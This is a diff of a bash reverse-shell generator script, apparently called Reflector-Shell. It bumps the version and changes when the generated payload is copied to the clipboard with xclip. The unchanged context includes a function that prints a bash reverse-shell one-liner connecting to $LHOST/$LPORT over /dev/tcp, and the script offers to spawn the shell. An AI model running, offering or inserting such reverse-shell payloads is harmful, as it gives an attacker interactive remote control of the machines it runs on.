@@ -1,6 +1,6 @@
 #!/bin/bash
 # Autor: MrMidnight
-# Version: 1.1
+# Version: 1.2
 
 function bash_i_PAYLOAD() {
     echo "$UWUSHELL -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
@@ -235,12 +235,12 @@ main() {
         *) echo "Invalid choice"; exit 1;;
     esac
 
-    if [ "$COPY" == true ]; then
-      echo "Your Reflector-Shell: $PAYLOAD_command"
-      echo "$PAYLOAD_command" | xclip -selection clipboard
+    if [ "$COPY" == true ] || command -v xclip 2>/dev/null; then
+        echo "Your Reflector-Shell: $PAYLOAD_command"
+        echo "$PAYLOAD_command" | xclip -selection clipboard
     else
-      echo "Your Reflector-Shell:"
-      echo "$PAYLOAD_command"
+        echo "Your Reflector-Shell:"
+        echo "$PAYLOAD_command"
     fi
 
     if [ "$SPAWN" == true ]; then
